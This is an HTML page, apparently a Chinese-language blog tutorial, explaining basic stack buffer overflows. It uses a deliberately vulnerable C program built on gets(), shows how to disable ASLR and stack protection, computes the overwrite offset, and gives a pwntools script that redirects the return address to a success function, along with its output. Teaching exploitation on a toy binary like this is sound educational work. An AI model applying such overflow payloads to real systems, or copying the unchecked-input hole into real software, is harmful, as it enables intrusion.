@@ -1,0 +1,751 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/favicon.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="介绍栈溢出指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变。这种问题是一种特定的缓冲区溢出漏洞，类似的还有堆溢出，bss 段溢出等溢出方式。栈溢出漏洞轻则可以使程序崩溃，重则可以使攻击者控制程序执行流程。此外，我们也不难发现，发生栈溢出的基本前提是  程序必须向栈上写入数据。  写入的数据大小没有被良好地控制。   基本原理栈溢出通过控">
+<meta property="og:type" content="article">
+<meta property="og:title" content="栈溢出">
+<meta property="og:url" content="https://equinox-shame.github.io/2022/03/14/%E6%A0%88%E6%BA%A2%E5%87%BA/index.html">
+<meta property="og:site_name" content="Autumnal">
+<meta property="og:description" content="介绍栈溢出指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变。这种问题是一种特定的缓冲区溢出漏洞，类似的还有堆溢出，bss 段溢出等溢出方式。栈溢出漏洞轻则可以使程序崩溃，重则可以使攻击者控制程序执行流程。此外，我们也不难发现，发生栈溢出的基本前提是  程序必须向栈上写入数据。  写入的数据大小没有被良好地控制。   基本原理栈溢出通过控">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2022-03-14T05:16:18.703Z">
+<meta property="article:modified_time" content="2022-03-06T06:50:21.931Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>栈溢出 - Autumnal</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"equinox-shame.github.io","root":"/","version":"1.9.3","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"2aM6IUUWOeDGCZaDdRhrvLam-gzGzoHsz","app_key":"GQdXw2PjI9DScgw5QHVCZeYm","server_url":"https://2am6iuuw.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Fluid</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                Home
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                Archives
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                Categories
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                Tags
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                About
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="栈溢出"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-03-14 13:16" pubdate>
+          March 14, 2022 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          4.1k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          35 mins
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> views
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">栈溢出</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>栈溢出指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变。这种问题是一种特定的缓冲区溢出漏洞，类似的还有堆溢出，bss 段溢出等溢出方式。栈溢出漏洞轻则可以使程序崩溃，重则可以使攻击者控制程序执行流程。此外，我们也不难发现，发生栈溢出的基本前提是</p>
+<ul>
+<li><p>程序必须向栈上写入数据。</p>
+</li>
+<li><p>写入的数据大小没有被良好地控制。</p>
+</li>
+</ul>
+<h2 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h2><p>栈溢出通过控制输入的字符串长度，覆盖对应栈空间内的函数的返回地址，把原先返回地址更改为目标函数的地址而实现调用其他函数。</p>
+<h2 id="基本示例"><a href="#基本示例" class="headerlink" title="基本示例"></a>基本示例</h2><p>最典型的栈溢出利用是覆盖程序的返回地址为攻击者所控制的地址，<strong>当然需要确保这个地址所在的段具有可执行权限</strong>。下面，我们举一个简单的例子：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">success</span><span class="hljs-params">()</span> </span>&#123; <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;You Hava already controlled it.&quot;</span>); &#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">vulnerable</span><span class="hljs-params">()</span> </span>&#123;<br>  <span class="hljs-keyword">char</span> s[<span class="hljs-number">12</span>];<br>  gets(s);<br>  <span class="hljs-built_in">puts</span>(s);<br>  <span class="hljs-keyword">return</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> **argv)</span> </span>&#123;<br>  vulnerable();<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>这个程序的主要目的读取一个字符串，并将其输出。<strong>我们希望可以控制程序执行 success 函数。</strong></p>
+<p>我们利用如下命令对其进行编译</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">➜  <span class="hljs-built_in">stack</span>-example gcc -m32 -fno-<span class="hljs-built_in">stack</span>-protector stack_example.c -o stack_example <br>stack_example.c: In function ‘vulnerable’:<br>stack_example.c:<span class="hljs-number">6</span>:<span class="hljs-number">3</span>: warning: implicit declaration of function ‘gets’ [-Wimplicit-function-declaration]<br>   gets(s);<br>   ^<br>/tmp/ccPU8rRA.o：在函数‘vulnerable’中：<br>stack_example.c:(.text+<span class="hljs-number">0x27</span>): 警告： the `gets<span class="hljs-number">&#x27;</span> function is dangerous <span class="hljs-keyword">and</span> should <span class="hljs-keyword">not</span> be used.<br></code></pre></td></tr></table></figure>
+
+<p>可以看出 gets 本身是一个危险函数。它从不检查输入字符串的长度，而是以回车来判断输入是否结束，所以很容易可以导致栈溢出，</p>
+<p>gcc 编译指令中，<code>-m32</code> 指的是生成 32 位程序； <code>-fno-stack-protector</code> 指的是不开启堆栈溢出保护，即不生成 canary。 此外，为了更加方便地介绍栈溢出的基本利用方式，这里还需要关闭 PIE（Position Independent Executable），避免加载基址被打乱。不同 gcc 版本对于 PIE 的默认配置不同，我们可以使用命令<code>gcc -v</code>查看 gcc 默认的开关情况。如果含有<code>--enable-default-pie</code>参数则代表 PIE 默认已开启，需要在编译指令中添加参数<code>-no-pie</code>。</p>
+<p>编译成功后，我们可以使用 <code>checksec</code> 工具检查编译出的文件：</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">➜</span>  <span class="hljs-string">stack-example</span> <span class="hljs-string">checksec</span> <span class="hljs-string">stack_example</span><br>    <span class="hljs-attr">Arch:</span>     <span class="hljs-string">i386-32-little</span><br>    <span class="hljs-attr">RELRO:</span>    <span class="hljs-string">Partial</span> <span class="hljs-string">RELRO</span><br>    <span class="hljs-attr">Stack:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">canary</span> <span class="hljs-string">found</span><br>    <span class="hljs-attr">NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><br>    <span class="hljs-attr">PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x8048000)</span><br></code></pre></td></tr></table></figure>
+
+<p>提到编译时的 PIE 保护，Linux 平台下还有地址空间分布随机化（ASLR）的机制。简单来说即使可执行文件开启了 PIE 保护，还需要系统开启 ASLR 才会真正打乱基址，否则程序运行时依旧会在加载一个固定的基址上（不过和 No PIE 时基址不同）。我们可以通过修改 <code>/proc/sys/kernel/randomize_va_space</code> 来控制 ASLR 启动与否，具体的选项有</p>
+<ul>
+<li>0，关闭 ASLR，没有随机化。栈、堆、.so 的基地址每次都相同。</li>
+<li>1，普通的 ASLR。栈基地址、mmap 基地址、.so 加载基地址都将被随机化，但是堆基地址没有随机化。</li>
+<li>2，增强的 ASLR，在 1 的基础上，增加了堆基地址随机化。</li>
+</ul>
+<p>我们可以使用<code>echo 0 &gt; /proc/sys/kernel/randomize_va_space</code>关闭 Linux 系统的 ASLR，类似的，也可以配置相应的参数。</p>
+<p>确认栈溢出和 PIE 保护关闭后，我们利用 IDA 来反编译一下二进制程序并查看 <code>vulnerable</code> 函数 。可以看到</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">vulnerable</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">char</span> s; <span class="hljs-comment">// [sp+4h] [bp-14h]@1</span><br><br>  gets(&amp;s);<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(&amp;s);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>该字符串距离 ebp 的长度为 0x14，那么相应的栈结构为</p>
+<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">             +-----------------+<br>             |<span class="hljs-string">     retaddr     </span>|<br>             +-----------------+<br>             |<span class="hljs-string">     saved ebp   </span>|<br>      ebp---&gt;+-----------------+<br>             |<span class="hljs-string">                 </span>|<br>             |<span class="hljs-string">                 </span>|<br>             |<span class="hljs-string">                 </span>|<br>             |<span class="hljs-string">                 </span>|<br>             |<span class="hljs-string">                 </span>|<br>             |<span class="hljs-string">                 </span>|<br>s,ebp-0x14--&gt;+-----------------+<br></code></pre></td></tr></table></figure>
+
+<p>并且，我们可以通过 IDA 获得 <code>success</code> 的地址，其地址为 <code>0x0804843B</code>。</p>
+<figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs tcl">.text:<span class="hljs-number">0804843</span>B success         <span class="hljs-keyword">proc</span><span class="hljs-title"> near</span><br>.text:0804843B<span class="hljs-title">                 push</span> <span class="hljs-title">   ebp</span><br>.text:0804843C<span class="hljs-title">                 mov</span> <span class="hljs-title">    ebp,</span> esp<br>.text:0804843E<span class="hljs-title">                 sub</span> <span class="hljs-title">    esp,</span> 8<br>.text:08048441<span class="hljs-title">                 sub</span> <span class="hljs-title">    esp,</span> 0Ch<br>.text:08048444<span class="hljs-title">                 push</span> <span class="hljs-title">   offset</span> s        ; &quot;You<span class="hljs-title"> Hava</span> already<span class="hljs-title"> controlled</span> it.&quot;<br>.text:08048449<span class="hljs-title">                 call</span> <span class="hljs-title">   _puts</span><br>.text:0804844E<span class="hljs-title">                 add</span> <span class="hljs-title">    esp,</span> 10h<br>.text:08048451<span class="hljs-title">                 nop</span><br>.text:08048452<span class="hljs-title">                 leave</span><br>.text:08048453<span class="hljs-title">                 retn</span><br>.text:08048453<span class="hljs-title"> success</span> <span class="hljs-title">        endp</span><br></code></pre></td></tr></table></figure>
+
+<p>那么如果我们读取的字符串为</p>
+<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp"><span class="hljs-number">0</span>x14*&#x27;a&#x27;+&#x27;bbbb&#x27;+success_addr<br></code></pre></td></tr></table></figure>
+
+<p>那么，由于 gets 会读到回车才算结束，所以我们可以直接读取所有的字符串，并且将 <code>saved ebp</code> 覆盖为 <code>bbbb</code>，将 <code>retaddr</code> 覆盖为 <code>success_addr</code>，即，此时的栈结构为</p>
+<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">             +-----------------+<br>             |<span class="hljs-string">    0x0804843B   </span>|<br>             +-----------------+<br>             |<span class="hljs-string">       bbbb      </span>|<br>      ebp---&gt;+-----------------+<br>             |<span class="hljs-string">                 </span>|<br>             |<span class="hljs-string">                 </span>|<br>             |<span class="hljs-string">                 </span>|<br>             |<span class="hljs-string">                 </span>|<br>             |<span class="hljs-string">                 </span>|<br>             |<span class="hljs-string">                 </span>|<br>s,ebp-0x14--&gt;+-----------------+<br></code></pre></td></tr></table></figure>
+
+<p>但是需要注意的是，由于在计算机内存中，每个值都是按照字节存储的。一般情况下都是采用小端存储，即 <code>0x0804843B</code>在内存中的形式是</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">\<span class="hljs-keyword">x</span><span class="hljs-number">3</span>b\<span class="hljs-keyword">x</span><span class="hljs-number">84</span>\<span class="hljs-keyword">x</span><span class="hljs-number">04</span>\<span class="hljs-keyword">x</span><span class="hljs-number">08</span><br></code></pre></td></tr></table></figure>
+
+<p>但是，我们又不能直接在终端将这些字符给输入进去，在终端输入的时候 \，x 等也算一个单独的字符。。所以我们需要想办法将 \x3b 作为一个字符输入进去。那么此时我们就需要使用一波 <code>pwntools </code>，这里利用 <code>pwntools</code>的代码如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">##coding=utf8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">## 构造与程序交互的对象</span><br>sh = process(<span class="hljs-string">&#x27;./stack_example&#x27;</span>)<br>success_addr = <span class="hljs-number">0x0804843b</span><br><span class="hljs-comment">## 构造payload</span><br>payload = <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0x14</span> + <span class="hljs-string">&#x27;bbbb&#x27;</span> + p32(success_addr)<br><span class="hljs-built_in">print</span> p32(success_addr)<br><span class="hljs-comment">## 向程序发送字符串</span><br>sh.sendline(payload)<br><span class="hljs-comment">## 将代码交互转换为手工交互</span><br>sh.interactive()<br></code></pre></td></tr></table></figure>
+
+<p>执行一波代码，可以得到</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs sh">➜  stack-example python exp.py<br>[+] Starting <span class="hljs-built_in">local</span> process <span class="hljs-string">&#x27;./stack_example&#x27;</span>: pid 61936<br>;\x84\x0<br>[*] Switching to interactive mode<br>aaaaaaaaaaaaaaaaaaaabbbb;\x84\x0<br>You Hava already controlled it.<br>[*] Got EOF <span class="hljs-keyword">while</span> reading <span class="hljs-keyword">in</span> interactive<br>$ <br>[*] Process <span class="hljs-string">&#x27;./stack_example&#x27;</span> stopped with <span class="hljs-built_in">exit</span> code -11 (SIGSEGV) (pid 61936)<br>[*] Got EOF <span class="hljs-keyword">while</span> sending <span class="hljs-keyword">in</span> interactive<br></code></pre></td></tr></table></figure>
+
+<p>可以看到我们确实已经执行 success 函数。</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>上面的示例其实也展示了栈溢出中比较重要的几个步骤。</p>
+<h3 id="寻找危险函数"><a href="#寻找危险函数" class="headerlink" title="寻找危险函数"></a>寻找危险函数</h3><p>通过寻找危险函数，我们快速确定程序是否可能有栈溢出，以及有的话，栈溢出的位置在哪里。常见的危险函数如下</p>
+<ul>
+<li>输入<ul>
+<li>gets，直接读取一行，忽略’\x00’</li>
+<li>scanf</li>
+<li>vscanf</li>
+</ul>
+</li>
+<li>输出<ul>
+<li>sprintf</li>
+</ul>
+</li>
+<li>字符串<ul>
+<li>strcpy，字符串复制，遇到’\x00’停止</li>
+<li>strcat，字符串拼接，遇到’\x00’停止</li>
+<li>bcopy</li>
+</ul>
+</li>
+</ul>
+<h3 id="确定填充长度"><a href="#确定填充长度" class="headerlink" title="确定填充长度"></a>确定填充长度</h3><p>这一部分主要是计算<strong>我们所要操作的地址与我们所要覆盖的地址的距离</strong>。常见的操作方法就是打开 IDA，根据其给定的地址计算偏移。一般变量会有以下几种索引模式</p>
+<ul>
+<li>相对于栈基地址的的索引，可以直接通过查看 EBP 相对偏移获得</li>
+<li>相对应栈顶指针的索引，一般需要进行调试，之后还是会转换到第一种类型。</li>
+<li>直接地址索引，就相当于直接给定了地址。</li>
+</ul>
+<p>一般来说，我们会有如下的覆盖需求</p>
+<ul>
+<li><strong>覆盖函数返回地址</strong>，这时候就是直接看 EBP 即可。</li>
+<li><strong>覆盖栈上某个变量的内容</strong>，这时候就需要更加精细的计算了。</li>
+<li><strong>覆盖 bss 段某个变量的内容</strong>。</li>
+<li>根据现实执行情况，覆盖特定的变量或地址的内容。</li>
+</ul>
+<p>之所以我们想要覆盖某个地址，是因为我们想通过覆盖地址的方法来<strong>直接或者间接地控制程序执行流程</strong>。</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Pwn/" class="category-chain-item">Pwn</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>栈溢出</div>
+      <div>https://equinox-shame.github.io/2022/03/14/栈溢出/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>John Doe</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>March 14, 2022</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/03/14/%E6%9C%BA%E5%99%A8%E6%95%B0/" title="机器数">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">机器数</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/03/14/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/" title="正则表达式">
+                        <span class="hidden-mobile">正则表达式</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;Table of Contents</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
